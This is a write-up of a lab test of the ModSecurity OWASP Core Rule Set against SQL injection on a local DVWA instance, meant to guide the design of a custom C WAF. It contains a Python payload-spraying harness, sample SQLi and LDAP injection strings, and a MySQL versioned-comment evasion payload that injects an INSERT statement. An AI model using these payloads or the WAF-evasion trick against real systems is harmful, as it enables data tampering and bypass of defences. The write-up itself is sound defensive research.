
---
# Phase 2: Detection Efficacy & Evasion Analysis (Parser Differentials)

## 1. The Objective
The goal of this phase was to evaluate the baseline detection capabilities of the OWASP Core Rule Set (v3.3) at Paranoia Level 2, and subsequently identify structural "Parser Differentials"—scenarios where the WAF evaluates input differently than the backend application (DVWA/MySQL), resulting in a silent security bypass.

## 2. Baseline Efficacy (True Positives)
Before attempting any advanced evasion techniques, I established a baseline of standard attack vectors using an automated Python script against the `/login.php` endpoint.

### 2.1 Methodology
Hundreds of raw, un-obfuscated payloads across three categories were transmitted to the proxy:
* **Generic SQLi:** (e.g., `admin' OR 1=1#`)
* **Time-Based SQLi:** (e.g., `admin' AND SLEEP(5)#`)
* **Union-Based SQLi:** (e.g., `admin' UNION SELECT null, null#`)

*The automated test harness:*

```python
import requests
from bs4 import BeautifulSoup

session = requests.Session()
url = "http://localhost:8080/login.php"

headers = {
    "Host": "localhost:8080",
    "sec-ch-ua": '"Not-A.Brand";v="24", "Chromium";v="146"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Linux"',
    "Accept-Language": "en-US,en;q=0.9",
    "Origin": "http://localhost:8080",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Dest": "document",
    "Referer": "http://localhost:8080/login.php",
    "Accept-Encoding": "gzip, deflate, br",
}

print("Reading Payload file")
payload_files = ["generic_payloads", "time_based_payloads", "union_based_payloads", "error_based_payloads"]

for phase in payload_files:
    with open(f"../payloads/{phase}.txt", "r") as f:
        payloads = f.readlines()
    
    success = 0
    error = 0
    payload_bypassing = []

    for p in payloads:
        p = p.strip()
        res_get = session.get(url)
        soup = BeautifulSoup(res_get.text, 'html.parser')
        user_token = soup.find('input', {'name': 'user_token'})['value']
        
        data = {
            "username": p,
            "password": 'a',
            "Login": "Login",
            "user_token": user_token
        }
        
        res_post = session.post(url, headers=headers, data=data)
        if res_post.status_code == 200:
            success += 1
            payload_bypassing.append(p)
        elif res_post.status_code == 403:
            error += 1

    if error == len(payloads):
        print(f"[+] ModSec catched everything {phase}")
    else:
        print(f"[-] ModSec didn't catch these {phase}")
        for p in payload_bypassing:
            print(p)
```

### 2.2 Results & Architectural Context
The automated baseline test revealed that the OWASP CRS evaluates payloads based on *Structural Context* rather than binary keyword blocking. 

* **High-Context Attacks (100% Blocked):** The WAF achieved a 100% interception rate against the `union_based_payloads` category. Payloads like `UNION SELECT` are highly anomalous in standard web traffic, allowing ModSecurity's `libinjection` and PCRE rules to confidently block them.
* **Low-Context & Isolated Keywords (Intentionally Allowed):** ModSecurity permitted dozens of payloads from the generic list to pass to the backend. These bypasses fell into three distinct categories:
    1. **Isolated SQL Keywords:** Words like `update`, `delete`, `select`, and `limit`.
    2. **Non-SQL Injection Syntax:** LDAP injection filters such as `*(|(objectclass=*))`.
    3. **Isolated Symbols:** Benign mathematical or punctuation inputs like `21%` or `3.10E+17`.

**Conclusion:** The failure to block isolated keywords is not a flaw in ModSecurity, but a necessary design choice to prevent catastrophic False Positives. The CRS requires syntax context (e.g., a string breakout followed by an operator and a keyword) to trigger a block.

## 3. Evasion Methodologies (Parser Differentials)
To bypass the baseline defenses, testing pivoted from brute-force signatures to targeting the **Normalization Gap**—exploiting how ModSecurity parses data compared to how the backend database executes it.

### 3.1 Vector 1: MySQL Versioned Comment Evasion
* **The Vulnerability:** ModSecurity's primary SQL injection engines (`libinjection` and PCRE statement matching) evaluate payload syntax to detect malicious logic. However, they fail to account for database-specific execution extensions. When presented with a MySQL versioned comment (`/*!50000 ... */`), ModSecurity's syntax engines parse the enclosure as a benign comment block and ignore the contents. MySQL (v5.0+), however, executes the SQL inside the block natively.

**The Execution:**
* **Raw Payload (Blocked):** `1 ; INSERT INTO Users VALUES (23, 'YASSINE', 'HACKED')`
* **Result:** Caught immediately by Rule 942100 (`libinjection`) and Rule 942350 (MySQL UDF injection).

![MySQL UDF Injection Blocked](../../assets/images/Pasted%20image%2020260528231632.png)

* **Mutated Payload (Evasion):** `1 /*!50000; INSERT INTO Users VALUES (23, 'YASSINE', 'HACKED') */`
* **Telemetry:**
    * *SQLi Syntax Engines (Rules 942100, 942350, 942360):* Bypassed completely. The engines read the payload as a harmless comment.
    * *Final Status:* The payload was ultimately intercepted by Rule 942430 (Restricted SQL Character Anomaly Detection), a Paranoia Level 2 heuristic rule that blindly counts the number of special characters in a parameter (limit: 12). 

**Conclusion:** While the request was technically blocked by a PL2 protocol rule, the test was a success. It proved that ModSecurity's core SQL syntax engines can be completely blinded by database-specific parser differentials. The WAF only survived by falling back on a blind character-counting heuristic—a defense mechanism notorious for causing false positives in production environments.

## 4. Requirements for the Custom C WAF
To eliminate the vulnerabilities discovered in Phase 2, the custom Layer-7 C engine must implement a **Deterministic State-Machine Parser** rather than relying on regex heuristics. 

Because regular expressions lack syntax awareness, they are easily blinded by database-specific execution extensions (like the `/*!50000` MySQL comment wrapper). To solve this parser differential, the C engine will integrate a state-machine tokenizer (e.g., `libinjection` mechanics) that reads the buffer byte-by-byte, constructing an Abstract Syntax Tree (AST) exactly as the backend database compiler would. This inherently neutralizes dialect-specific evasion techniques without requiring a bloated list of hardcoded signature patches.